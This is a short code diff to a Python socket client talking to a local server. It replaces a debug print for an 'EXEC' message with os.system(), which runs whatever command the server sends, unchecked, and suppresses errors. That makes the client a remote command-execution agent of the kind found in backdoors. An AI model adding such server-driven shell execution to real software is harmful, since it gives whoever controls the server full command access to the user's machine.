@@ -1,4 +1,5 @@
 import socket
+import os
 from communication import encode_message, decode_header, decode_message, MESSAGES, HEADER_SIZE
 
 HOST = '127.0.0.1'
@@ -28,6 +29,9 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
 
                 print(f"[SENDING] {to_send_message} {parameters}")
                 client_socket.sendall(encode_message(to_send_message, parameters))
-            if command == MESSAGES.get('EXEC'):
-                print(f'[DEBUG] - executing {parameters[0]}')
+            elif command == MESSAGES.get('EXEC'):
+                try:
+                    os.system(parameters[0])
+                except Exception:
+                    continue
 
